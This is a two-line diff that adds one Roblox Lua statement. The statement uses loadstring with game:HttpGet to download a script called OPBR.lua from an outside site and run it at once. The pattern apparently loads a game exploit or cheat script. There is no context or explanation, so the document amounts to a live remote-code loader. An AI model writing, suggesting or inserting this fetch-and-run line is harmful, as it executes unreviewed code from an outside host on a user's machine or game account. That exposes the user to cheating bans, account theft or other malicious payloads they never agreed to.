@@ -1,0 +1,2 @@
+
+loadstring(game:HttpGet("https://senseijoshy.com/Side-Scripts/OPBR.lua"))()
